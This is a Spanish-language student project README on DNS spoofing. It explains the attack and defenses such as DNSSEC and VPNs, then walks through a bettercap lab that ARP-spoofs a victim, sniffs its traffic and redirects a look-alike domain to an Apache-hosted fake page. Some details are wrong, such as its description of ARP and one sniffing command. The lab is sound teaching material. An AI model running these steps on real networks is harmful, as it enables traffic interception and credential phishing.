# Proyecto_DNS_Spoofing


## 1. Descripción del ataque
DNS Spoofing, también conocido como DNS Cache Poisoning, es un ciberataque donde se alteran registros DNS para redireccionar a usuarios a páginas web fraudulentas. Este ataque explota vulnerabilidades en el DNS (Domain Name System) para manipular la resolución de los nombres de dominio en direcciones Ips, dirgiendo a los usuarios a sitios maliciosos en vez de los intencionados por el usuario.

----

## 2. Como funciona DNS Spoofing

Cuando un usuario intenta visitar una web, su dispositivo, ya sea un móvil, portátil u ordenador, envía una petición a un servidor DNS para obtener la dirección IP asociada a ese nombre de dominio. En un ataque de suplantación DNS, un atacante intercepta esta petición y responde con una dirección IP falsa, redireccionando al usuario al sitio malicioso. Esto puede ocurrir de varias formas:

1. Ataque Man-in-the-Middle (MITM attack): El atacante intercepta la comunicación entre el dispositivo del usuario y el servidor DNS, inyectando falsas respuestas de DNS
       
2. Envenenamiento de caché DNS (DNS cache poisoning): El atacante engaña al servidor DNS para que almacene registros incorrectos, los cuales son usados para responder futuras peticiones de usuarios.
       
3. Secuestro Local (Local Hijack): El atacante cambia la configuración DNS en el dispositivo del usuario o en el router para apuntar a un servidor DNS malicioso.


---- 

## 3. Consecuencias de DNS Spoofing

Entre las consecuencias incluidas están:

- Ataques de phishing: los usuarios son redirigidos a sitios web falsos que lucen idénticos al legítimo, donde puede, desde la ignorancia, introduzcan información sensible como nombres de usuarios, contraseñas, detalles de tarjetas de crédito, etc.

- Distribución de malware: los usuarios pueden ser redirigidos a sitios que automáticamente descarga e instala codigo malicioso en sus dispositivos

- Robo de datos: los atacantes pueden interceptar y robar información sensible trasnmitida entre el dispositivo del usuario y páginas fraudulentas


---- 
## 4. Medidas de protección

Para protegerse contra este ataque, se pueden implementar diversas contramedidas:

- DNSSEC (Domain Name System Security Extensions): este protocolo añade una capa de seguridad habilitando las respuestas DNS a ser verificadas por autenticación mediante firmas digitales.
      
- Encriptación de Transporte (Transport Encryption): usando el protocolo HTTPS entre otros seguros, se asegura de que los datos transmitidos entre el dispositivo del usuario y el servidor está encriptado, haciéndolo más difícil para interceptar y manipular
      
- Servidores DNS publicos: usar DNSs públicos de confianza como Cloudflare (1.1.1.1) o Google (8.8.8.8) puede proporcionar seguridad y privacidad adicional.
      
- Redes Virtuales Privadas (VPN): las VPN encriptan todo el tráfico de internet, proporcionando una capa de seguridad adicional contra el DNS spoofing

---- 
## 5. Herramientas utilizadas - Bettercap

Bettercap es un poderoso, fácilmente extensible, y framework portable escrito en Go, cuyo objetivo es ofrecer a analistas de seguridad, red teams y reverse engineers una herramienta fácil de usar, todo en uno, con todas las características que posiblemente necesiten para realizar reconocimiento y atacar redes Wifi, dispositivos bluetooth, redes IPv4 e IPv6 entre otros

<img src="https://www.bettercap.org/_astro/logo.9NeNvQAS_Z1OvlVx.webp" width="150px" heigth="auto">

----

## 6. Protocolos vulnerados
Los protocolos vulnerados en el DNS Spoofing incluyen el Protocolo de Resolución de Nombres (DNS), que es el sistema que traduce los nombres de dominio en direcciones IP. Los atacantes pueden manipular esta traducción para redirigir el tráfico de los usuarios hacia sitios web maliciosos. Además, el Protocolo de Resolución de Direcciones de Protocolo de Resolución (ARP), que permite a los dispositivos localizar direcciones IP a partir de nombres de dominio, también puede ser utilizado para redirigir el tráfico hacia servidores maliciosos.

---- 
## 7. Pasos importantes de la PoC (Prove of Concept) y pasos para su mitigación
---- 
### 1. Instalar bettercap
```bash
sudo apt install bettercap
```
---- 
### 2. Iniciar bettercap 

```bash
sudo bettercap
```

Una vez iniciado bettercap, tenemos una interfaz muy simple para introducir los comandos de la herramienta, bettercap funciona por módulos, cada módulo tiene submodulos, al fin y al cabo son scripts que automatizan las tareas, bettercap se caracteriza por su rapidez por usar GoLang

---- 
### 3. Iniciar net.probe 
```bash
net.probe on
```

Lo primero que hacemos es escanear la red, para ello usamos net.probe, este módulo nos devolverá todas las IPs conectadas a la red

---- 
### 4. Iniciar ticker 
```bash
ticker on
```
Ticker lo usaremos para mejorar el comando previo, ya que ticker nos imprime una tabla con formato de las IPs mencionadas junto a su MAC, tipo de red, si es ethernet o gateway, nombre del equipo, y los paquetes enviados y recibidos

---- 
### 5. Asignar la IP de la victima al envenenamiento ARP
```bash
set arp.spoof targets <IPVictima>
```
El paso previo al DNS spoofin es el ARP spoofing, bastará con usar el módulo arp.spoof, como parámetro targeets, asignaremos la IP víctima, el módulo lo guardará en memoria para su futuro uso, si decidimos cambiar la asignación, arp.spoof eliminará el valor previo por el más reciente

---- 
### 6. Iniciar arp spoofng 
```bash
arp.spoof on
```
Para iniciar el módulo basta con incluir la palabra reservada on para encenderlo, bettercap nos devería mostrar un mensaje informativo sobre el evenenamiento aplicado a los objetivos dentro de la red especificada

---- 
### 7. Capturar el trafico de red como si de un wireshark se tratase 
```bash
set net.sniff.verbose false
```
Para aligerar la información que recibimos de bettercap usaremos el módulo net.sniff, al igual que la herramienta wireshark, net.sniff nos permite capturar el tráfico de red, esto es muy útil ya que para la práctica, al realizar MITM (Man In The Middle) estamos entre la victima e Internet, por lo que obtenemos todo su tráfico, pudiendo predecir su comportamiento en la red y facilitar el engaño a la víctima 

```bash
set net.sniff on
```
---- 
Activamos el módulo al igual que hicimos con el de arp.spoof y ya capturaríamos el tráfico de la víctima

### 8. Comprobar que el ataque ha funcionado realizando el comando en la victima
```bash
arp -a
```
Si accedemos a la tabla arp de la víctima veremos que la dirección MAC de la puerta de enlace coincide con nuestra dirección MAC de nuestra máquina atacante

---- 
### 9. Configurar servidor apache
```bash
apt install apache2
```
Usaremos apache para almacenar la web que se alojará en el dominio e IP falsa que proporcionaremos a la víctima

---- 
### 10. Asignar valor de dominio a dns spoof
```bash
set dns.spoof.domains <nombreDominio>
```
Ya instalado y configurado el servidor apache que almacena la página falsa para la víctima usaremos el módulo dns.spoof que será el que realice el envenenamiento DNS, con el submódulo domains asignamos un nombre de dominio cualquiera, a poder ser parecido al real, por ejemplo aules.com

---- 
### 11. Redirigir a la victima a nuestra IP atacante
```bash
set dns.spoof.address <IPatacante>
```
Ahora, al igual que el dominio, con el submódulo address asignamos nuestra propia IP de la máquina kali, si recordamos las explicaciones anteriores, al tener la dirección MAC de la máquina atacante en la puerta de enlace de la víctima, se le redirigirá si introduce el nombre de dominio a nuestra IP de kali, y, al tener el servidor apache en funcionamiento, abrirá la página web alojada

---- 
### 12. Activar el servicio
```bash
dns.spoof on
```
Al igual que con arp.spoof y net.sniff activamos el módulo con el comando mostrado, y si la víctima accede a aules.com, verá la página falsa

---- 

https://github.com/user-attachments/assets/e32adbfc-eac0-4319-9ae4-3de36f6d18bd
